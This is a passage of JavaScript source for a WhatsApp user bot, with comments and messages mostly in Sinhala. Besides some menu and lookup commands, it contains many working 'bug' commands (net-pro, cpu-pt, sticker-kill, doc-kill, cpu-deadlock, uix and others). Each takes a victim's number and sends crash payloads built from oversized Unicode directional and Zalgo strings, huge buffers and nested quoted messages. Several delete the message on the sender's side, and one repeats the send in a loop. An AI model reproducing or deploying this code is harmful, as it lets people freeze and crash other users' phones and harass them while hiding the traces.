                    showAdAttribution: true, // Verified Badge එක පෙන්වීමට ✅
                    externalAdReply: {
                        title: 'HAPPY NEW YEAR 2026 🎆',
                        body: 'Alpha Vision Infinity V4',
                        thumbnailUrl: nyImage,
                        sourceUrl: 'https://whatsapp.com/channel/0029Vb6ZqSqF1YlPZOErhP1M',
                        mediaType: 1
                    }
                }
            });
        } catch (e) {
            console.log(`Error sending to ${id}: ${e}`);
        }
    }

    await m.reply(`*සාර්ථකයි! සියලුම දෙනා වෙත සුබපැතුම් යවා අවසන්.* ✅`);
}
break;



case 'tstmenu': {
    // 1. වීඩියෝ එකේ ලින්ක් එක (Video එකක් සඳහා Catbox හෝ වෙනත් Direct Link එකක් දෙන්න)
    const aliveVid = 'https://files.catbox.moe/c2gii8.mp4'; 
    // 2. උඩින් පේන පොඩි Thumbnail පින්තූරය
    const thumbImg = 'https://files.catbox.moe/jggkxf.jpg';

    const aliveText = `
*👋 හෙලෝ @${m.sender.split('@')[0]}!*

මම දැනට සක්‍රීයව වැඩ කරනවා. (I am Alive Now) 🟢

*🤖 Bot Name:* ALPHA VISION INFINTY
*👤 Owner:* Avishka Dev
*⏳ Runtime:* ${runtime(process.uptime())}
*⚡ Version:* 4.0.0

${tstmenu}
_ඔබට අවශ්‍ය ඕනෑම සහයක් සඳහා මෙනු එක (.menu) පරීක්ෂා කරන්න._`;

    await Avishka.sendMessage(m.chat, {
        video: { url: aliveVid }, // මෙතනට Video එක එනවා
        caption: aliveText,
        gifPlayback: true, // වීඩියෝ එක Auto Play වෙන්න ඕන නම් මේක true කරන්න
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                title: 'ALPHA VISION INFINTY IS ALIVE',
                body: 'The Best WhatsApp User Bot',
                thumbnailUrl: thumbImg, // මෙතනට Thumbnail එක විතරක් එන නිසා පින්තූර දෙකක් එන්නේ නැහැ
                sourceUrl: 'https://whatsapp.com/channel/0029Vb6ZqSqF1YlPZOErhP1M',
                mediaType: 1,
                renderLargerThumbnail: false // මේක false කළොත් පින්තූර දෙකක් පේන එක සම්පූර්ණයෙන්ම නැති වෙයි
            }
        }
    }, { quoted: m });
}
break;




case 'getjid':{
    let link = m.text.split(' ')[1]
    if (!link) return m.reply("*කරුණාකර Channel Link එක ලබා දෙන්න!*")

    if (link.includes('whatsapp.com/channel/')) {
        let code = link.split('channel/')[1]
        try {
            // Xeon හෝ පරණ Baileys වල වැඩ කරන direct query එක
            const result = await Avishka.query({
                tag: 'iq',
                attrs: {
                    type: 'get',
                    xmlns: 'newsletter',
                    to: '@s.whatsapp.net',
                },
                content: [{
                    tag: 'metadata',
                    attrs: { view: 'invite', id: code }
                }]
            })

            // ලැබෙන result එකෙන් ID එක අදිනවා
            const newsletter = result.content[0]
            const id = newsletter.attrs.id
            const name = newsletter.content.find(x => x.tag === 'name').content.toString()
            
            let resText = `*📢 CHANNEL FOUND*\n\n`
            resText += `*Name:* ${name}\n`
            resText += `*ID:* ${id}@newsletter\n` // මෙන්න නියම ID එක
            
            await m.reply(resText)

        } catch (err) {
            console.error(err)
            m.reply("*Error:* ID එක ගන්න බැරි වුණා. Link එකේ අවසාන කෑල්ල විතරක් දීලා බලන්න (උදා: .jid 0029VaXxxxx)")
        }
    } else if (link.includes('chat.whatsapp.com/')) {
        // Groups වලට මේක වැඩ කරනවා
        try {
            let code = link.split('chat.whatsapp.com/')[1]
            let info = await Avishka.groupGetInviteInfo(code)
            m.reply(`*👥 GROUP ID:* ${info.id}`)
        } catch {
            m.reply("*Error:* Group ID එක ගන්න බැහැ.")
        }
    } else {
        m.reply("*කරුණාකර වලංගු Link එකක් දෙන්න!*")
    }
}
break


case 'net-pro': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // CPU එකට Render කරන්න බැරි අතිශය සංකීර්ණ අක්ෂර (Zalgo + Unicode Directional)
    const heavyPayload = ("\u202E\u200B\u034F\u2060\u200E\u17B4\u17B5".repeat(2000));
    
    // URL එකක් වෙනුවට Raw Buffer එකක් පාවිච්චි කිරීම (Error එක නොවීමට)
    const fakeFile = Buffer.alloc(1024 * 500, heavyPayload); // 500KB "Fake" Document Buffer

    try {
        const sentMsg = await Avishka.sendMessage(target, {
            // මෙහිදී URL එක වෙනුවට කෙලින්ම Buffer එක ලබා දෙමු
            document: fakeFile, 
            mimetype: 'application/octet-stream',
            fileName: "NETWORK_FREEZE_SYSTEM\n" + heavyPayload.substring(0, 500),
            pageCount: 999999,
            fileLength: 99999999999,
            caption: "🚀 AVI-PRO-NETWORK-BUG\n" + "ꦾ".repeat(40000),
            contextInfo: {
                mentionedJid: Array(25).fill(target),
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: "Status: CONNECTED_OVERLOADED",
                    body: "Payload Stream: " + heavyPayload.substring(0, 500),
                    mediaType: 1,
                    // ඉතා විශාල රූප සටහනක් ලෙස පෙන්වන පෑලෝඩ් එකක්
                    thumbnail: fakeFile.slice(0, 50000), // මුල් 50KB thumbnail එක ලෙස
                    sourceUrl: "https://avi-internal-network-stress-test.com/" + "҉".repeat(500),
                    renderLargerThumbnail: false,
                    showAdAttribution: true
                },
                // Quoted message එකට Call message එකක් දීම (මෙය Notification UI එක ගොඩක් හිර කරයි)
                quotedMessage: {
                    scheduledCallCreationMessage: {
                        title: heavyPayload,
                        callType: 1
                    }
                }
            }
        });

        // Sender Side Cleanup - යවන කෙනාගේ පැත්තෙන් මැකීම
        setTimeout(async () => {
            await Avishka.sendMessage(m.chat, { delete: sentMsg.key });
        }, 1200);

        m.reply("🚀 Net-Pro Payload එක යවන ලදී. දැන් Target එකේ UI එක 'Not Responding' වෙයි.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;


case 'cpu-pt': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // CPU එකට Render කරන්න අපහසු අතිශය සංකීර්ණ රටාව (Zalgo + Complex Formatting)
    const lagChar = "\u202E\u034F\u2060\u200E\u200C\u17B4\u17B5".repeat(2000);
    const extremePayload = Array(15).fill(lagChar).join("\n");

    try {
        const sentMsg = await Avishka.sendMessage(target, {
            // Product message එකක් ලෙස යැවීම (UI එකට මෙය ලොකු බරක්)
            product: {
                productImage: { url: 'https://invalid-image.com/test.jpg' }, 
                productId: "AVI-BUG-" + lagChar.substring(0, 500),
                title: "PRINCE-AVI-V4 ⚠️\n" + extremePayload.substring(0, 5000),
                description: extremePayload,
                currencyCode: "LKR",
                priceAmount1000: "999999999",
                retailerId: "ALPHA-INFINITY",
                productImageCount: 1
            },
            caption: "⚠️ CRITICAL_SYSTEM_OVERLOAD\n" + "ꦾ".repeat(50000),
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                mentionedJid: Array(50).fill(target),
                // Quoted Message එකක් ලෙස සංකීර්ණ List එකක් දැමීම
                quotedMessage: {
                    listMessage: {
                        title: extremePayload.substring(0, 1000),
                        description: extremePayload,
                        buttonText: "FREEZE",
                        listType: 1,
                        sections: [{
                            title: "Bug-Bounty-Test",
                            rows: [{title: "System-Kill", rowId: "1"}]
                        }]
                    }
                }
            }
        });

        // තත්පර 1කින් ඔයාගේ පැත්තෙන් මැකීම (එතකොට ඔයාගේ UI එක ලැග් වෙන්නේ නැහැ)
        setTimeout(async () => {
            await Avishka.sendMessage(m.chat, { delete: sentMsg.key });
        }, 1500);

        m.reply("🚀 Product-Stress Payload එක යවන ලදී. ලබන්නාගේ UI එක Render වීමට උත්සාහ කරන විට හිර වනු ඇත.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;

case 'sticker-kill': {
    if (!text) return m.reply(`භාවිතය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    try {
        // 1. අතිශය බලවත් Invisible Unicode රටාව
        const heavyUnicode = "\u034F\u2060\u200E\u200C".repeat(10000);
        
        // 2. මෙහිදී අපි Dummy ස්ටිකර් දත්ත (WebP) එකක් නිර්මාණය කරනවා
        // සැබෑ ස්ටිකරයක් වෙනුවට කෙලින්ම Buffer එකක් යැවීමෙන් App එක ව්‍යාකූල වේ
        const stickerBuffer = Buffer.alloc(1024 * 150, 0x01); // 150KB දූෂිත දත්ත

        await Avishka.sendMessage(target, {
            sticker: stickerBuffer,
            contextInfo: {
                externalAdReply: {
                    title: "⚠️ SYSTEM_HALT",
                    body: heavyUnicode.substring(0, 100),
                    mediaType: 1,
                    // Thumbnail එකටත් ලොකු දත්ත කොටසක් දීමෙන් Crash එක තීව්‍ර වේ
                    thumbnail: Buffer.alloc(1024 * 30, 0x00), 
                    sourceUrl: "https://github.com/Prince-Avi-MD"
                },
                // පණිවිඩය ලැබුණු සැණින් Notification එක හරහා Crash කිරීමට
                forwardingScore: 999,
                isForwarded: true,
                mentionedJid: Array(30).fill(target)
            }
        });

        m.reply("🎯 Invisible Sticker-Payload එක යවන ලදී. Victim ගේ Sticker Engine එක අඩපණ වනු ඇත.");

    } catch (err) {
        console.log(err);
        m.reply("❌ Error: Meta Protection System මගින් අවහිර කරන ලදී.");
    }
}
break;




case 'doc-kill': {
    if (!text) return m.reply(`භාවිතය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // 1. අතිශය බලවත් Binary Payload එකක් නිර්මාණය කිරීම
    // මෙහිදී අපි null bytes සහ unicode මිශ්‍ර කර ලොකු ගොනුවක් මවාපානවා
    const heavyDoc = Buffer.alloc(1024 * 700, 'AVI-BUG'); // 700KB Payload

    try {
        // 2. Document පණිවිඩයක් ලෙස යැවීම
        await Avishka.sendMessage(target, {
            document: heavyDoc,
            mimetype: 'application/octet-stream', // හඳුනාගත නොහැකි ගොනු වර්ගයක්
            fileName: '⚠️ SYSTEM_UPDATE.bin',
            pageCount: 999999, // අතිවිශාල පිටු ගණනක් පෙන්වීමෙන් UI එක හිර කරයි
            fileLength: 9999999999999, // බොරු ගොනු ප්‍රමාණයක් පෙන්වීම
            caption: "☠️ " + "ꦾ".repeat(10000),
            contextInfo: {
                externalAdReply: {
                    title: "CRITICAL SYSTEM OVERLOAD",
                    body: "Prince-Avi-MD V4 Security Test",
                    mediaType: 1,
                    thumbnail: heavyDoc.slice(0, 10000), // දත්ත කොටසක් thumbnail එකට දීම
                    sourceUrl: "https://github.com/Prince-Avi-MD"
                }
            }
        });

        m.reply("✅ Document Payload එක යවන ලදී. මෙය ලබන්නාගේ 'File Indexer' එක අඩපණ කරනු ඇත.");

    } catch (err) {
        console.log(err);
        m.reply("❌ Error: පද්ධතිය මගින් පණිවිඩය අවහිර කරන ලදී.");
    }
}
break;



case 'avi-ui': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // CPU එක Render කරන්න ගොස් හිරවන අතිශය සංකීර්ණ අක්ෂර මාලාව
    // මෙහි \u202E (Right-to-Left Override) දහස් ගණනක් ඇත
    const cpuBurner = ("\u202E\u200B\u034F\u2060\u200E".repeat(9999) + "҉ꦾ".repeat(7000));
    const finalPayload = Array(999).fill(cpuBurner).join(" "); // දත්ත ප්‍රමාණය තවත් වැඩි කිරීම

    try {
        await Avishka.sendMessage(target, {
            text: "PRINCE-AVI-MD 4V ⚠️ \n" + "ꦾ".repeat(9999),
            contextInfo: {
                mentionedJid: [target],
                externalAdReply: {
                    title: "Avishka shavinda: " + finalPayload.substring(0, 9999),
                    body: "© 𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢...",
                    mediaType: 1,
                    renderLargerThumbnail: false,
                    // මෙහිදී image එකක් වෙනුවට තවත් පෑලෝඩ් එකක් metadata වලට දීම
                    sourceUrl: "https://Avi" + finalPayload.substring(0, 999) + ".com"
                },
                // පණිවිඩය ලැබුණු සැනින් Notification එක පෙන්වීමට CPU එක උත්සාහ කරන විට හිර කිරීමට
                quotedMessage: {
                    adminInviteMessage: {
                        inviteCode: finalPayload,
                        groupJid: "120300000000000000@g.us",
                        caption: finalPayload
                    }
                }
            }
        });

        m.reply("🚀 Avi-ui Bug එක යවන ලදී. ටාගට් එකේ Notification බාර් එක පවා හිර වීමට ඉඩ ඇත.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;




case 'menu': m.react('⏳'); {
				await Avishka.sendButtonMsg(m.chat, {
					text: `\n
> 口 PRINCE-AVI-MD _ !!

  *𝗕𝗢𝗧 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡* 


❒ 𝙱𝚘𝚝 𝚗𝚊𝚖𝚎 : 𝙿𝚁𝙸𝙽𝙲𝙴-𝙰𝚅𝙸-𝙼𝙳
❒ 𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : 𝙰𝚟𝚒𝚜𝚑𝚔𝚊 𝚂𝚑𝚊𝚟𝚒𝚗𝚍𝚊
❒ 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : 5.0𝚟
❒ 𝚂𝚝𝚊𝚝𝚞𝚜 : *𝙾𝚗𝚕𝚒𝚗𝚎*
口 𝚃𝚒𝚖𝚎 : ${Times} 
口 𝙳𝚊𝚝𝚎 : ${Avidate} 

`,
					footer: '𝚜𝚌𝚛𝚒𝚙𝚝 𝚘𝚏  ' + botname + ' 𝚒𝚜 𝚘𝚗 𝚈𝙾𝚄𝚃𝚄𝙱𝙴 @𝙰𝚟𝚒𝚜𝚑𝚔𝚊 𝚜𝚑𝚊𝚟𝚒𝚗𝚍𝚊',
					buttons: [
						{
							buttonId: '.owner',
							buttonText: { displayText: 'Owner' },
							
							type: 1
						},
					{
							buttonId: '.donate',
							buttonText: { displayText: 'Support' },
							
							type: 1
						},
						{
							buttonId: '.allmenu',
							buttonText: { displayText: 'All-menu' },
							type: 1
						}
					],
					headerType: 3,
					image: { url: 'https://files.catbox.moe/jggkxf.jpg' }
				}, { quoted: m });
			}
		m.react('✅');
break

case 'avi': case'developer': m.react('⏳'); {
				await Avishka.sendButtonMsg(m.chat, {
					text: `
*° Country :* SRI LANKA

*° Name :* ᴬⱽᴵ

*° Url Api :* wa.me/94772836332

*° BusinessId :* 94772836332@s.whatsapp.net

*° Address :* 26H7+XFV, Galle 80000, Sri Lanka

*° Timeone :* Asia/Colombo

*° Description* : Ｆᴏʀ ＳᴛΔᵀᴜs Ｖɪᴠᴇs "😓❤️🖇️ ⭕𝐒 ᴀᴠᴇ 𝐌ᴇᴇ ..😙💗

https://wa.me/+94772836332?text=°ᥫ᭡__Hey_🥹ᴬⱽᴵ.z🤍💋

Name 👀🎀| 𝙰𝚅𝙸 🌝🤍🎀

Age 🥹💋| +22. 🌚

From 😫׀𝙶𝙰𝙻𝙻𝙴 .😙💗

𝚁
𝙴
𝙰
𝙻

𝙺
𝙸
𝙽
𝙶

𝙰
𝚅
𝙸

᳐᳐᳐᳐᳐
᳐᳐᳐᳐᳐᳐
_"තේරුම්"_ ගැනීම_"කලාවක්"_ නම් _"ආදරේ_"ලස්සන රටාවක්💗🥀_"විශ්වාසය"_ ලඟ තියෙනම් _"ජිවිතය "_ලස්සන කතාවක්❤️🥀

🩵 𝙰𝚅𝙸 🩵
`,
					footer: '𝚜𝚌𝚛𝚒𝚙𝚝 𝚘𝚏  ' + botname + ' 𝚒𝚜 𝚘𝚗 𝚈𝙾𝚄𝚃𝚄𝙱𝙴 @𝙰𝚟𝚒𝚜𝚑𝚔𝚊 𝚜𝚑𝚊𝚟𝚒𝚗𝚍𝚊',
					buttons: [
						{
							buttonId: '.owner',
							buttonText: { displayText: 'Owner' },
							
							type: 1
						},
					{
							buttonId: '.donate',
							buttonText: { displayText: 'Support' },
							
							type: 1
						},
						{
							buttonId: '.allmenu',
							buttonText: { displayText: 'All-menu' },
							type: 1
						}
					],
					headerType: 3,
					image: { url: 'https://github.com/Avi-3a/PRINCE-AVI-MD/blob/main/AMedia/Avi.jpeg?raw=true' }
				}, { quoted: m });
			}
		m.react('✅');
break






case 'ratt': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let victimJid = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // පද්ධතියේ RAM එක පිරවීමට භාවිතා කරන අතිවිශාල පෑලෝඩ් එක
    const heavyPayload = "😍".repeat(100) + "\u200E\u200F\u202E\u034F\u2060".repeat(1500) + "¥".repeat(3000);

    try {
        // Reaction එකක් ලෙස පෙනෙන නමුත් ඇතුළත දත්ත විශාල පණිවිඩයක් සැකසීම
        const reactionBug = {
            react: {
                text: "😍", // පෙනෙන ඉමෝජි එක
                key: {
                    remoteJid: "status@broadcast",
                    fromMe: false,
                    id: "ABC123456789", // මෙතැනට වික්ටිම්ගේ Status එකේ ID එක තිබිය යුතුයි
                    participant: victimJid
                }
            },
            // මෙන්න මෙතනට තමයි අපි Crash metadata එක දාන්නේ
            contextInfo: {
                quotedMessage: {
                    conversation: heavyPayload // Reaction එක බලන විට ඇප් එක මෙතැනදී Crash වේ
                },
                externalAdReply: {
                    title: "CRITICAL_REACTION_STRESS",
                    body: heavyPayload.substring(0, 500),
                    mediaType: 1
                }
            }
        };

        // පණිවිඩය සෘජුවම Relay කිරීම
        await Avishka.relayMessage(victimJid, reactionBug, { 
            participant: victimJid 
        });

        m.reply("✅ Status Reaction Attack එක යවන ලදී. වික්ටිම් එම reaction එක බැලීමට උත්සාහ කරන විට ඇප් එක Freeze වනු ඇත.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;

case 'get-vcard': {
    const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 
                  'FN:Avishka Shavinda \n' + // නම අසලට මෙන්න මේ ලකුණ දාන්න
                  'ORG:Official Verified Bot;\n' + 
                  'TEL;type=CELL;type=VOICE;waid=9472836332:94772836332\n' + 
                  'END:VCARD';
    await Avishka.sendMessage(m.chat, { 
        contacts: { 
            displayName: 'Avi', 
            contacts: [{ vcard }] 
        } 
    });
}
break;


case 'verify-msg': {
    await Avishka.sendMessage(m.chat, {
        text: "Verified Bot Message ✅",
        contextInfo: {
            externalAdReply: {
                title: "PRINCE-AVI-MD OFFICIAL",
                body: "Verified System Account",
                mediaType: 1,
                showAdAttribution: true, // මෙන්න මේකෙන් "Verified" පෙනුම එනවා
                renderLargerThumbnail: false,
                sourceUrl: "https://avi-verify.com"
            }
        }
    });
}
break;



case 'cpu-deadlock': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // 1. UI එක සම්පූර්ණයෙන්ම ලොක් කරන අක්ෂර (Zalgo + Unicode 14.0 Complex Glyphs)
    const crashScript = "\u034F\u0361\u035C\u202E\u2060\u200B\u17B4\u17B5\u1160".repeat(4000);
    const heavyStack = "ꦾꦿꦼꦽᦗᦘᦙᦚ҉".repeat(2000);

    // 2. RAM එකේ විශාල ඉඩක් ගන්නා Buffer එකක්
    const deathBuffer = Buffer.alloc(1024 * 800, crashScript); 

    try {
        const sentMsg = await Avishka.sendMessage(target, {
            // ප්‍රධාන පණිවිඩය (Text Buffer Overload)
            text: "⚠️ CRITICAL_DEADLOCK_DETECTED ⚠️\n" + heavyStack.repeat(5),
            
            contextInfo: {
                mentionedJid: Array(100).fill(target),
                forwardingScore: 999,
                isForwarded: true,
                
                // 3. External Ad Reply - මෙහි Thumbnail එකට Buffer එක දීමෙන් Notification එක පවා හිර වේ
                externalAdReply: {
                    title: "SYSTEM_HANG_SERVICE: " + heavyStack.substring(0, 500),
                    body: "Waiting for UI Thread... [TIMEOUT_ERROR]",
                    mediaType: 1,
                    thumbnail: deathBuffer,
                    renderLargerThumbnail: true,
                    sourceUrl: "https://avi-internal-deadlock-v5.moc"
                },

                // 4. Nested Quoted Message (මේක තමයි 5min freeze එක ඇති කරන්නේ)
                quotedMessage: {
                    listMessage: {
                        title: crashScript.substring(0, 1000),
                        description: heavyStack,
                        buttonText: "RECOVERY_MODE",
                        listType: 1,
                        sections: [{
                            title: "CPU_KILLER_SECTION",
                            rows: [{title: "CRASH_SYSTEM", rowId: "1"}]
                        }]
                    },
                    // තවත් layer එකක් ලෙස Vcard එකක් එකතු කිරීම
                    contactMessage: {
                        displayName: "DEADLOCK_SERVICE",
                        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${heavyStack};;;\nFN:${heavyStack}\nNOTE:${crashScript}\nEND:VCARD`
                    }
                }
            }
        }, { 
            messageId: "AVI-KILL-" + "9".repeat(50) + Date.now() 
        });

        // Sender ගේ ආරක්ෂාවට මැකීම
        setTimeout(async () => {
            await Avishka.sendMessage(m.chat, { delete: sentMsg.key });
        }, 1000);

        m.reply("🚀 5-Minute Deadlock Payload එක යවන ලදී. ටාගට් එකේ WhatsApp සහ System UI දෙකම හිර වීමට ඉඩ ඇත.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;


case 'cpu5': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // 1. CPU එක ව්‍යාකූල කරවන දරුණුම Unicode අක්ෂර (Javanese + Khmer + Zalgo + RTL)
    const scriptKill = "ꦾꦿꦼꦽᦗᦘᦙᦚ҉᪢᪣ᫍᫎ\u17B4\u17B5\u202E\u034F\u2060\u200B";
    const megaPayload = scriptKill.repeat(4000); // අක්ෂර දහස් ගණනක Loop එකක්

    // 2. RAM එක පිරවීමට හදන Binary Buffer එකක් (500KB - 1MB වගේ ප්‍රමාණයක්)
    const ramBuffer = Buffer.alloc(1024 * 700, scriptKill);

    try {
        const sentMsg = await Avishka.sendMessage(target, {
            // ප්‍රධාන පණිවිඩය (Text Buffer Overload)
            text: "⚠️ CRITICAL_SYSTEM_LOCK ⚠️\n" + megaPayload.repeat(5),
            
            contextInfo: {
                mentionedJid: Array(100).fill(target), // Notification UI එක හිර කිරීමට Mentions 100ක්
                forwardingScore: 999,
                isForwarded: true,
                
                // 3. External Ad Reply එකේ Thumbnail එකට සෘජුවම RAM Buffer එක දීම
                externalAdReply: {
                    title: "SYSTEM_FAILURE_DETECTED: " + scriptKill.repeat(500),
                    body: "Memory Leak in Logic Thread...",
                    mediaType: 1,
                    thumbnail: ramBuffer, // මෙය ලැබුණු සැනින් RAM එකට බරක් දෙයි
                    sourceUrl: "https://avi-internal-bug." + megaPayload.substring(0, 1000),
                    renderLargerThumbnail: true,
                    showAdAttribution: true
                },

                // 4. Nested Quoted Message (Vcard + Order මිශ්‍රණය)
                quotedMessage: {
                    orderMessage: {
                        orderId: "AVI-" + megaPayload.substring(0, 5000),
                        thumbnail: ramBuffer.slice(0, 50000),
                        itemCount: 999999999,
                        status: 1,
                        surface: 1,
                        message: megaPayload,
                        orderTitle: megaPayload.substring(0, 3000),
                        sellerJid: target
                    },
                    // Vcard එකක් ඇතුළත තවත් පෑලෝඩ් එකක් (Double Impact)
                    contactMessage: {
                        displayName: "SYSTEM KILLER",
                        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${megaPayload};;;\nFN:${megaPayload}\nNOTE:${megaPayload}\nEND:VCARD`
                    }
                }
            }
        }, { 
            // Message ID එක දිගු කිරීමෙන් Database ලැග් එකක් ඇති කිරීම
            messageId: "AVI-STRESS-" + "0".repeat(60) + Date.now() 
        });

        // 5. Sender Side Protection: තත්පර 1කින් යවන්නාගේ පැත්තෙන් මැකීම
        setTimeout(async () => {
            await Avishka.sendMessage(m.chat, { delete: sentMsg.key });
        }, 1200);

        m.reply("🚀 Ultimate CPU/RAM Freeze Payload එක යවන ලදී. ටාගට් එකේ WhatsApp එක 'Not Responding' වනු ඇත.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;


case 'final-bug': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    
    // JID එක නිවැරදිව සකසා ගැනීම (Error Fix)
    let jid = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // පද්ධතියට දිරවා ගැනීමට අපහසු Payload එක
    const bugText = "🗡REAL-KING-AVI🗡".repeat(100) + "\u200E\u200F\u202E\u034F\u2060".repeat(1000);

    try {
        const forceMessage = {
            interactiveMessage: {
                header: {
                    title: bugText.substring(0, 1000),
                    hasMediaAttachment: true,
                    jpegThumbnail: fs.readFileSync(`./AMedia/Avix.png`)
                },
                body: { text: "Tap the 😍 Reaction Sticker below!" },
                nativeFlowMessage: {
                    buttons: [{
                        name: "review_and_pay",
                        buttonParamsJson: JSON.stringify({
                            currency: "IDR",
                            total_amount: { value: 49981399788, offset: 100 },
                            reference_id: "4OON4PX3FFJ",
                            order: {
                                status: "payment_requested",
                                items: [{ name: bugText, amount: { value: 9999900, offset: 100 }, quantity: 99 }]
                            }
                        })
                    }]
                },
                contextInfo: {
                    mentionedJid: [jid],
                    // ඔබ පින්තූරයේ පෙන්වූ 😍 Interaction එක අනුකරණය කිරීම
                    externalAdReply: {
                        title: "😍 REACT NOW TO VIEW CONTENT",
                        body: "Vulnerability Stress Test active...",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnailUrl: "https://telegra.ph/file/your-avatar-link.jpg",
                        sourceUrl: "https://whatsapp.com/channel/example"
                    }
                }
            }
        };

        // Status එකක් ලෙස යැවීම (Relay Message හරහා වඩාත් සාර්ථකයි)
        await Avishka.relayMessage("status@broadcast", forceMessage, {
            participant: jid,
            additionalAttributes: { "status-type": "image" }
        });

        m.reply("✅ Reaction & Force Payload සාර්ථකව යවන ලදී. ටාගට් එකේ UI එක දැන් ලැග් වීමට පටන් ගනු ඇත.");
    } catch (err) {
        console.error(err);
        m.reply("❌ පද්ධති දෝෂයක්: " + err.message);
    }
}
break;



case 'ptv': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // ඉතා ප්‍රබල අක්ෂර රටාවක් (Payload)
    const bugText = "ꦾ".repeat(999999) + "\u200E\u200F\u202E\u034F\u2060".repeat(99999);

    try {
        // රවුම් වීඩියෝවක් (PTV) ලෙස පණිවිඩය සකස් කිරීම
        await Avishka.sendMessage(target, {
            video: { url: 'https://files.catbox.moe/cwtzkt.mp4' }, // ඕනෑම වීඩියෝ URL එකක්
            caption: bugText, // Caption එකට විශාල දත්ත
            ptv: true, // මෙය රවුම් වීඩියෝවක් (Push To Video) ලෙස සලකුණු කරයි
            mimetype: 'video/mp4',
            contextInfo: {
                externalAdReply: {
                    title: "Security Test: " + "🔥".repeat(1000),
                    body: bugText.substring(0, 1000),
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        });
        m.reply("✅ PTV (Circle Video) Bug Payload එක යවන ලදී.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;




case 'uix': {
    let [number, amount] = text.split('/');
    if (!number || !amount) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx/වාර ගණන`);

    let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    let loopCount = parseInt(amount);

    if (isNaN(loopCount)) return m.reply("❌ වාර ගණන අංකයක් විය යුතුය.");

    // ඔබේ මුල් පෑලෝඩ් එක
    const cpuBurner = ("\u202E\u200B\u034F\u2060\u200E".repeat(5000) + "҉ꦾ".repeat(7000));
    const finalPayload = Array(2000).fill(cpuBurner).join(" ");

    m.reply(`🚀 Avi-ui [ULTRA-POWER] ${loopCount}ක් යැවීම ආරම්භ කළා...`);

    for (let i = 0; i < loopCount; i++) {
        try {
            // relayMessage භාවිතා කිරීමෙන් පණිවිඩය තවත් වේගවත් සහ ප්‍රබල වේ
            await Avishka.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        extendedTextMessage: {
                            text: `⚠️ PRINCE-AVI-MD ULTRA V4 [${i+1}] ⚠️\n` + "ꦾ".repeat(50000),
                            contextInfo: {
                                mentionedJid: [target, "0@s.whatsapp.net"], // අමතර Mentions පද්ධතිය ලැග් කිරීමට
                                isForwarded: true,
                                forwardingScore: 999,
                                externalAdReply: {
                                    title: "AVI_POWER_OVERLOAD: " + finalPayload.substring(0, 5000),
                                    body: "© 𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘ܢ 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢",
                                    mediaType: 1,
                                    renderLargerThumbnail: true,
                                    // Thumbnail එකට විශාල Buffer එකක් ලබා දීම
                                    thumbnail: Buffer.alloc(1024 * 300, cpuBurner), 
                                    sourceUrl: "https://avi-crash-service.io/" + finalPayload.substring(0, 1000)
                                },
                                // පණිවිඩය Quoted Message එකක් ලෙස ඇතුළත් කිරීම (Double Stress)
                                quotedMessage: {
                                    adminInviteMessage: {
                                        inviteCode: finalPayload,
                                        groupJid: "120363000000000000@g.us",
                                        caption: finalPayload,
                                        groupName: cpuBurner.substring(0, 1000)
                                    }
                                }
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });

            // වේගය වැඩි කිරීමට delay එක තත්පර 1 දක්වා අඩු කළා
